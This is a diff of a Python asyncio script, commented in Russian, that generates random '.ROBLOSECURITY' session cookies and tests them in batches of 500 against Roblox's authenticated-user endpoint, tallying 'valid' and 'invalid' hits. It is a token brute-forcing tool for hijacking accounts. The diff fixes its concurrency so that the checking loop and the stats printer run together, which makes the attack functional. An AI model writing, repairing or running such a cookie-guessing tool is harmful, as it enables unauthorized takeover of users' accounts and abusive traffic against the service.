@@ -1,8 +1,11 @@
 import asyncio
 import aiohttp
 import random
+
+# Глобальные переменные для хранения статистики
 invalid = 0
 valid = 0
+
 # Функция для генерации случайного кука
 def generate_cookie():
     valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
@@ -11,6 +14,7 @@ def generate_cookie():
 
 # Асинхронная функция для проверки одного кука
 async def check_cookie(session, cookie):
+    global invalid, valid
     url = 'https://users.roblox.com/v1/users/authenticated'
     cookies = {'.ROBLOSECURITY': cookie}
     
@@ -29,14 +33,23 @@ async def check_cookies_concurrently(n):
             tasks.append(check_cookie(session, cookie))
         await asyncio.gather(*tasks)
 
+# Функция для периодического вывода статистики
+async def print_stats():
+    global invalid, valid
+    while True:
+        print(f"Invalid: {invalid}")
+        print(f"Valid: {valid}")
+        await asyncio.sleep(10)
+
 # Главная функция для запуска асинхронных задач
 async def main():
-    while True:
-        print(f"invalid: {invalid}")
-        print(f"valid: {valid}")
-        await asyncio.sleep(10)
-    while True:
-        await check_cookies_concurrently(500)  # Проверяем 1000 куков одновременно
+    # Запускаем одновременно две задачи:
+    # 1. Проверка куков
+    # 2. Периодический вывод статистики
+    await asyncio.gather(
+        check_cookies_concurrently(500),  # Проверяем 500 куков одновременно
+        print_stats()                      # Выводим статистику каждые 10 секунд
+    )
 
 # Точка входа в скрипт
 if __name__ == "__main__":
